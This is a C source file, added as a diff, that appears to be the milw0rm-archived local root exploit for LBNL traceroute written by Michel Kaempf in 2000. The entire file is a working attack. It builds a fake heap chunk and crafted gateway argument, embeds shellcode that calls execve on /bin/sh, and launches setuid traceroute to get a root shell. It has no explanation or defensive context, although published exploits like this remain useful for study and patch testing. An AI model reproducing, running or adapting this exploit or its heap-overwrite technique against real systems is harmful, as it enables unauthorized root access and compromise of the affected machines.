@@ -1,0 +1,137 @@
+/*
+ * MasterSecuritY <www.mastersecurity.fr>
+ *
+ * openwall.c - Local root exploit in LBNL traceroute
+ * Copyright (C) 2000  Michel "MaXX" Kaempf <maxx@mastersecurity.fr>
+ *
+ * Updated versions of this exploit and the corresponding advisory will
+ * be made available at:
+ *
+ * ftp://maxx.via.ecp.fr/traceroot/
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#define PREV_INUSE 0x1
+#define IS_MMAPPED 0x2
+
+char *		filename = "/usr/sbin/traceroute";
+unsigned int	stack = 0xc0000000 - 4;
+unsigned int	p = 0x0804ce38;
+unsigned int	victim = 0x0804c88c;
+
+char * jmp = "\xeb\x0aXXYYYYZZZZ";
+
+char * shellcode =
+	/* <shellcode>:		xor	%edx,%edx	*/
+	"\x31\xd2"
+	/* <shellcode+2>:	mov	%edx,%eax	*/
+	"\x89\xd0"
+	/* <shellcode+4>:	mov	$0xb,%al	*/
+	"\xb0\x0b"
+	/* <shellcode+6>:	mov	$XXXX,%ebx	*/
+	"\xbbXXXX"
+	/* <shellcode+11>:	mov	$XXXX,%ecx	*/
+	"\xb9XXXX"
+	/* <shellcode+16>:	mov	%ebx,(%ecx)	*/
+	"\x89\x19"
+	/* <shellcode+18>:	mov	%edx,0x4(%ecx)	*/
+	"\x89\x51\x04"
+	/* <shellcode+21>:	int	$0x80		*/
+	"\xcd\x80";
+
+char * program = "/bin/sh";
+
+int zero( unsigned int ui )
+{
+	if ( !(ui & 0xff000000) || !(ui & 0x00ff0000) || !(ui & 0x0000ff00) || !(ui & 0x000000ff) ) {
+		return( -1 );
+	}
+	return( 0 );
+}
+
+int main()
+{
+	char		gateway[ 1337 ];
+	char		host[ 1337 ];
+	char *		argv[] = { filename, "-g", "123", "-g", gateway, host, NULL };
+	unsigned int	next;
+	int		i;
+	unsigned int	hellcode;
+	unsigned int	size;
+
+	strcpy( host, "AAAABBBBCCCCDDDDEEEE" );
+	next = stack - (strlen(filename) + 1) - (strlen(host) + 1) + strlen("AAAA");
+	for ( i = 0; i < next - (next & ~3); i++ ) {
+		strcat( host, "X" );
+	}
+	next = next & ~3;
+
+	((unsigned int *)host)[1] = 0xffffffff & ~PREV_INUSE;
+	((unsigned int *)host)[2] = 0xffffffff;
+	if ( zero( victim - 12 ) ) {
+		fprintf( stderr, "Null byte(s) in `victim - 12' (0x%08x)!\n", victim - 12 );
+		return( -1 );
+	}
+	((unsigned int *)host)[3] = victim - 12;
+	hellcode = p + (strlen("123") + 1) + strlen("0x42.0x42.0x42.0x42") + strlen(" ");
+	if ( zero( hellcode ) ) {
+		fprintf( stderr, "Null byte(s) in `host' (0x%08x)!\n", hellcode );
+		return( -1 );
+	}
+	((unsigned int *)host)[4] = hellcode;
+
+	size = next - (p - 4);
+	size = size | PREV_INUSE;
+	sprintf(
+		gateway,
+		"0x%02x.0x%02x.0x%02x.0x%02x",
+		((unsigned char *)(&size))[0],
+		((unsigned char *)(&size))[1],
+		((unsigned char *)(&size))[2],
+		((unsigned char *)(&size))[3]
+	);
+
+	strcat( gateway, " " );
+	strcat( gateway, jmp );
+	strcat( gateway, shellcode );
+	strcat( gateway, program );
+
+	hellcode += strlen(jmp) + strlen(shellcode);
+	if ( zero( hellcode ) ) {
+		fprintf( stderr, "Null byte(s) in `gateway' (0x%08x)!\n", hellcode );
+		return( -1 );
+	}
+	*((unsigned int *)(gateway + strlen("0x42.0x42.0x42.0x42") + strlen(" ") + strlen(jmp) + 7)) = hellcode;
+
+	hellcode += strlen(program) + 1;
+	if ( zero( hellcode ) ) {
+		fprintf( stderr, "Null byte(s) in `gateway' (0x%08x)!\n", hellcode );
+		return( -1 );
+	}
+	*((unsigned int *)(gateway + strlen("0x42.0x42.0x42.0x42") + strlen(" ") + strlen(jmp) + 12)) = hellcode;
+
+	execve( argv[0], argv, NULL );
+	return( -1 );
+}
+
+
+
+// milw0rm.com [2000-11-15]
